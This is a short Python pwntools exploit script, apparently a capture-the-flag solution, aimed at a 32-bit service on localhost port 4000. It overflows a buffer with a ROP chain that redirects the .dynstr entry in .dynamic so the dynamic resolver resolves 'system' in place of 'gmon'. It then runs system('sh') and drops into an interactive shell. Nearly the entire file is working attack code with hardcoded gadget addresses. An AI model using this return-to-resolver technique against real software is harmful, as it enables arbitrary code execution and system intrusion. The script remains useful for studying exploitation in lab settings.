#!/usr/bin/env python

from pwn import *

context.arch='i386'

r = remote('127.0.0.1', 4000)
"""
The senario is that we want to return to resolver.
We first replace the string entry of gmon in .dynstr with our symbol 'system\0'
Then, jump to the gmon resolver.
resolver will instead resolve the 'system' rather than 'gmon'.
finally, jump to 
"""



# no ver
read = 0x80482f0
memcpy = 0x8048300
plt0 = 0x80482e0
pop3 = 0x80484d9
pop2 = 0x80484da
pop1 = 0x80484db
gmon = 0x08048310

buf = 0x8049740
d = buf + 2048
dynamic = 0x08049604
# the dynstr entry is at the 8th entry in .dynamic
dynamic_dynstr = dynamic + 8 * 8

rop = flat(
    # memcpy has three parameters
    memcpy, pop3, dynamic_dynstr + 4, d + 0, 4,
    gmon, 0xdeadbeef, d + 12
    )

data = flat(
    d + 4 - 56,  # d+4
    'system\x00\x00' # d+12
    'sh\x00' 
    )

raw_input('@')
r.send(('A'*18 + p32(buf+1024+4)).ljust(1024, '\0') + rop.ljust(1024, '\0') + data)

r.interactive()
